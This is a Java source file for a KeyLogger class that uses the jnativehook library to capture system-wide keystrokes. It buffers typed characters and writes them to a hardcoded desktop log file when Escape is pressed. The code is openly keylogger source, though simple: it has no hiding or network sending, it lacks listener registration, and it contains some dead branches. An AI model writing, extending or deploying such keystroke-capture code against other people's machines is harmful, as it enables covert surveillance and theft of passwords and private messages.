import java.awt.event.KeyEvent;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener{

	private String fileName = "/Users/Summit/Desktop/log.txt";

	private StringBuilder sb;
	
	public KeyLogger(){
		sb = new StringBuilder();
	}
	
	public void createLog(){
		BufferedWriter out = null;
		try {
			File logFile = new File(fileName);
			if(!logFile.exists()){
				logFile.createNewFile();
			}
			logFile.setReadable(true);
			logFile.setWritable(true);

			out = new BufferedWriter(new FileWriter(logFile));
			
			if(sb.length() > 0){
				out.write(sb.toString());
				if(sb.length() == 0) {
					out.write("Nothing to Log!");
				}
				System.out.println("LogFile Written Successfully!");
			}
		}catch(IOException e){
			e.printStackTrace();
		}finally{
			if(out!=null){
				try{
					out.close();
				}catch(IOException e){
					e.printStackTrace();
				}
			}
		}
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

		if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
			createLog();
			System.exit(0);
		}
	}

	public void nativeKeyTyped(NativeKeyEvent key) {
		int id = key.getID();
		if (id == NativeKeyEvent.NATIVE_KEY_TYPED) {
			sb.append(key.getKeyChar());
			if(key.getKeyChar() == NativeKeyEvent.VK_TAB) {
				sb.append("\t");
			}
		} else {
			int keyCode = key.getKeyCode();
			sb.append("Key Code = " + key.getKeyCode() + " (" + KeyEvent.getKeyText(keyCode) + ")");
		}
	}
	
	public void nativeKeyReleased(NativeKeyEvent e) {}
}
